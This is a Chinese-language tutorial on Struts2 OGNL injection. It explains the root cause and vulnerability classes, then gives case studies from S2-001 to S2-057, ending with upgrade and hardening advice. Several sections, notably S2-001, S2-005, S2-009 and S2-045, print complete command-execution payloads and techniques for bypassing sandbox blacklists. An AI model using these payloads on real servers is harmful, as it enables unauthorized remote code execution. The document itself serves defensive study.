# Struts2 OGNL 表达式注入漏洞

## 概述

Apache Struts2 是一个基于 MVC（Model-View-Controller）设计模式的开源 Java Web 应用框架，广泛用于构建企业级 Java EE 网络应用程序。Struts2 以 WebWork 为核心，采用拦截器机制处理用户请求。

然而，Struts2 框架因其内部大量使用 OGNL（Object-Graph Navigation Language）表达式语言，导致了一系列严重的远程代码执行（RCE）漏洞。这些漏洞允许攻击者在未经授权的情况下在目标服务器上执行任意代码，造成了重大的安全威胁。

自 2007 年首个正式版本发布以来，Struts2 已报告了超过 60 个安全漏洞（S2-001 至 S2-061+），其中大部分为高危的远程代码执行漏洞。

---

## OGNL 简介

### 什么是 OGNL？

OGNL（Object-Graph Navigation Language，对象图导航语言）是一种功能强大的表达式语言。它于 2002 年被引入，主要特点包括：

- **对象属性访问**：可以存取对象的任意属性
- **方法调用**：能够调用对象的方法
- **静态方法调用**：支持调用 Java 类的静态方法
- **类实例化**：可以创建新的对象实例
- **表达式求值**：支持复杂的表达式计算

### OGNL 在 Struts2 中的应用

Struts2 使用 OGNL 作为默认的表达式语言，主要用于：

1. **数据传输**：在 View 层和 Controller 层之间传递数据
2. **参数绑定**：将 HTTP 请求参数绑定到 Action 对象
3. **表达式解析**：在 JSP 标签中解析表达式
4. **类型转换**：自动进行数据类型转换

### OGNL 基本语法

```java
// 访问对象属性
user.name

// 调用方法
'helloworld'.length()

// 访问静态方法
@java.lang.String@format('foo %s', 'bar')

// 创建新对象
new java.lang.ProcessBuilder({'cmd'}).start()

// 访问上下文对象（使用 # 符号）
#context['xwork.MethodAccessor.denyMethodExecution']

// OGNL 表达式标记
%{expression}  或  ${expression}
```

### ValueStack（值栈）

ValueStack 是 Struts2 中 OGNL 的根对象，贯穿整个 Action 的生命周期。当 Struts2 接收到 `.action` 请求后：

1. 创建 Action 类的对象实例
2. 将 Action 属性放入 ValueStack 的顶层节点
3. 拦截器根据请求参数更新 ValueStack 中的属性值
4. 最后调用 Action 方法

---

## 漏洞原理

### 核心问题

OGNL 表达式注入漏洞的核心问题在于：**当用户可控的输入被传递给 OGNL 的 `getValue()` 或 `setValue()` 方法进行解析时，攻击者可以注入恶意的 OGNL 表达式，从而执行任意 Java 代码**。

```java
// 简单的 OGNL 执行示例
OgnlContext context = new OgnlContext();
Object result = Ognl.getValue("@java.lang.Runtime@getRuntime().exec('whoami')", context);
```

### 漏洞触发场景

1. **参数名解析**：HTTP 参数名被直接解析为 OGNL 语句
2. **参数值解析**：用户输入的参数值被当作 OGNL 表达式执行
3. **二次解析**：表达式被递归解析，导致用户输入被二次执行
4. **异常处理**：错误信息中包含用户输入，并被 OGNL 解析
5. **标签属性处理**：JSP 标签的某些属性值被 OGNL 解析

### 关键安全机制

Struts2 提供了一些安全机制来限制 OGNL 的执行：

1. **SecurityMemberAccess**：控制成员访问权限
2. **allowStaticMethodAccess**：禁止静态方法调用（默认为 false）
3. **denyMethodExecution**：禁止方法执行
4. **excludedClasses/excludedPackageNames**：黑名单机制

然而，这些机制在早期版本中经常被绕过。

---

## 常见漏洞类型

### 1. 参数名注入

Struts2 将 HTTP 请求的每个参数名解析为 OGNL 语句执行。

```
// 示例
user.name=value  →  解析为 OGNL: user.name
```

**代表漏洞**：S2-003、S2-005、S2-009

### 2. 参数值注入

用户提交的参数值被当作 OGNL 表达式执行。

**代表漏洞**：S2-001、S2-007、S2-012

### 3. 二次表达式解析

框架对表达式进行递归解析，导致用户输入被多次处理。

```java
// %{value} 被解析后，value 的内容再次被当作表达式解析
%{user.input}  →  如果 user.input = %{malicious_code}  →  执行恶意代码
```

**代表漏洞**：S2-001、S2-015

### 4. 异常信息处理

异常信息中包含用户输入，并被 OGNL 解析。

**代表漏洞**：S2-045、S2-046

### 5. 配置错误利用

利用不当的配置（如重定向、通配符匹配）触发 OGNL 执行。

**代表漏洞**：S2-012、S2-016

---

## 典型漏洞案例

### S2-001 (CVE-2007-4556)

**影响版本**：WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8

**漏洞原理**：
- 当用户提交表单数据并验证失败时，后端使用 `%{value}` 对提交的数据进行 OGNL 表达式解析
- 由于递归解析，用户输入的 OGNL 表达式被执行

**利用条件**：
- 表单验证失败后回显用户输入
- altSyntax 功能开启（默认开启）

**Payload 示例**：
```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#e)),#out.close()}
```

### S2-005 (CVE-2010-1870)

**影响版本**：Struts 2.0.0 - Struts 2.1.8.1

**漏洞原理**：
- S2-003 通过过滤 `#` 字符来防御，但攻击者使用 Unicode 编码（`\u0023`）或八进制（`\43`）绕过
- S2-005 通过修改安全配置（`allowStaticMethodAccess`、`denyMethodExecution`）来绕过防护

**Payload 示例**：
```
('\u0023_memberAccess[\'allowStaticMethodAccess\']')(vaaa)=true&
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023vccc')(\u0023vccc\u003dnew java.lang.Boolean("false"))&
('\u0023rt.exec("whoami")')(\u0023rt\u003d@java.lang.Runtime@getRuntime())=1
```

### S2-007 (CVE-2012-0838)

**影响版本**：Struts 2.0.0 - Struts 2.2.3

**漏洞原理**：
- 当配置了验证规则，类型转换失败时，用户输入被拼接为 `'value'`
- 通过闭合单引号注入 OGNL 表达式

**Payload 示例**：
```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '
```

### S2-009 (CVE-2011-3923)

**影响版本**：Struts 2.1.0 - Struts 2.3.1.1

**漏洞原理**：
- ParametersInterceptor 的正则表达式将 `top['foo'](0)` 作为有效表达式
- OGNL 将其处理为 `(top['foo'])(0)`，对 foo 参数值进行 OGNL 表达式求值

**Payload 示例**：
```
/ajax/example5.action?age=12313&name=(#context["xwork.MethodAccessor.denyMethodExecution"]=false,#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#s=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#s.println(#d),#s.close())(meh)&z[(name)('meh')]
```

### S2-012 (CVE-2013-1965)

**影响版本**：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.13

**漏洞原理**：
- 配置 Action 的 Result 时使用重定向类型，并使用 `${param_name}` 作为重定向变量
- Struts2 在获取参数值时执行 OGNL 表达式解析

**配置示例**：
```xml
<action name="save" class="org.apache.struts2.showcase.action.SkillAction" method="save">
    <result type="redirect">edit.action?skillName=${currentSkill.name}</result>
</action>
```

### S2-016 (CVE-2013-2251)

**影响版本**：Struts 2.0.0 - Struts 2.3.15

**漏洞原理**：
- 通过操作带有前缀 `action:`、`redirect:`、`redirectAction:` 的参数
- 这些特殊前缀的参数值会被当作 OGNL 表达式执行

**Payload 示例**：
```
hello.action?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c','whoami'})).start()}
```

### S2-045 (CVE-2017-5638)

**影响版本**：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

**漏洞原理**：
- 使用基于 Jakarta 插件的文件上传功能时
- Content-Type 值无效时抛出异常，异常信息中包含 Content-Type 值
- 异常信息被 OGNL 解析执行

**这是 Equifax 数据泄露事件的元凶，影响极其严重。**

**Payload 示例**：
```
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())...}
```

### S2-046 (CVE-2017-5638)

**影响版本**：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

**漏洞原理**：
- 与 S2-045 类似，但注入点在文件上传的 Content-Disposition 的 filename 字段
- 使用 `\x00` 截断触发异常

**触发条件**：
1. Content-Length 超过 2GB
2. filename 字段包含恶意 OGNL 表达式

### S2-048 (CVE-2017-9791)

**影响版本**：Struts 2.3.x with Struts 1 plugin

**漏洞原理**：
- 将用户可控的值添加到 ActionMessage 并在客户端展示
- 导致进入 getText 函数，message 被当作 OGNL 表达式执行

### S2-057 (CVE-2018-11776)

**影响版本**：Struts 2.3 - Struts 2.3.34, Struts 2.5 - Struts 2.5.16

**漏洞原理**：
- URL 传递到 Struts 框架时处理不当
- 允许攻击者在受影响的服务器上运行恶意 OGNL 表达式

---

## Payload 构造分析

### 标准 Payload 结构

典型的 OGNL 注入 Payload 通常包含以下步骤：

```java
// 1. 修改安全配置
#_memberAccess["allowStaticMethodAccess"]=true
#context["xwork.MethodAccessor.denyMethodExecution"]=false

// 2. 获取 Runtime 对象
@java.lang.Runtime@getRuntime()

// 3. 执行命令
.exec('command')

// 4. 获取输出（可选）
.getInputStream()
```

### 完整 Payload 示例

```java
(#_memberAccess["allowStaticMethodAccess"]=true,
 #_memberAccess["denyMethodExecution"]=false,
 #context["xwork.MethodAccessor.denyMethodExecution"]=false,
 #cmd="whoami",
 #iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win")),
 #cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/bash","-c",#cmd}),
 #p=new java.lang.ProcessBuilder(#cmds),
 #p.redirectErrorStream(true),
 #process=#p.start(),
 #ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),
 @org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),
 #ros.flush())
```

### 绕过技术

1. **Unicode 编码绕过**
```
\u0023  →  #
\u003d  →  =
```

2. **八进制编码绕过**
```
\43  →  #
```

3. **二次解析绕过**
```
top['foo'](0)  →  解析为 (top['foo'])(0)
```

4. **清除黑名单**
```java
#ognlUtil.getExcludedPackageNames().clear()
#ognlUtil.getExcludedClasses().clear()
```

5. **修改 MemberAccess**
```java
#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
```

---

## 防御与修复方案

### 1. 升级版本（首要推荐）

这是最有效的防御措施。根据漏洞版本升级到安全版本：

- S2-045/046：升级到 Struts 2.3.32 或 2.5.10.1 以上
- 一般建议：使用最新的稳定版本

```xml
<!-- Maven 依赖示例 -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.5.30</version> <!-- 使用最新安全版本 -->
</dependency>
```

### 2. 关闭动态方法调用

```xml
<constant name="struts.enable.DynamicMethodInvocation" value="false" />
```

### 3. 关闭开发者模式

```xml
<constant name="struts.devMode" value="false" />
```

### 4. 配置拦截器白名单

```xml
<interceptor-ref name="params">
    <param name="excludeParams">
        dojo\..*,^struts\..*,^session\..*,^request\..*,^application\..*,^servlet(Request|Response)\..*,^parameters\..*
    </param>
</interceptor-ref>
```

### 5. 输入过滤

- 严格过滤 Content-Type、filename 等字段
- 禁止 OGNL 表达式相关字符（`#`、`%{}`、`${}`）

### 6. WAF/IDS 规则

配置 Web 应用防火墙检测：

- OGNL 特征字符串
- 恶意 Content-Type
- 异常长度的 HTTP 头

### 7. 删除不必要的组件

如果不使用文件上传功能，可以删除：
```
commons-fileupload-x.x.x.jar
```

### 8. 使用安全库

升级相关依赖：
```
freemarker-2.3.22.jar
ognl-3.0.19.jar
xwork-core-2.3.32.jar
```

### 9. 代码层面防护

```java
// 避免直接使用用户输入构造 OGNL 表达式
// 不要这样做：
String expression = userInput;
Object result = Ognl.getValue(expression, context);

// 应该进行严格的输入验证和白名单过滤
```

---

## 参考资源

### 官方资源

- Apache Struts 安全公告：https://struts.apache.org/security/
- Apache Struts 文档：https://struts.apache.org/docs/
- CVE 数据库：https://cve.mitre.org/

### 学习资源

- Vulhub 漏洞环境：https://github.com/vulhub/vulhub
- Struts2 漏洞调试环境：https://github.com/sie504/Struts-S2-xxx
- OGNL 官方文档：https://commons.apache.org/proper/commons-ognl/

### 检测工具

- Metasploit Framework
- Nuclei Templates
- Struts2 [专用扫描器]()
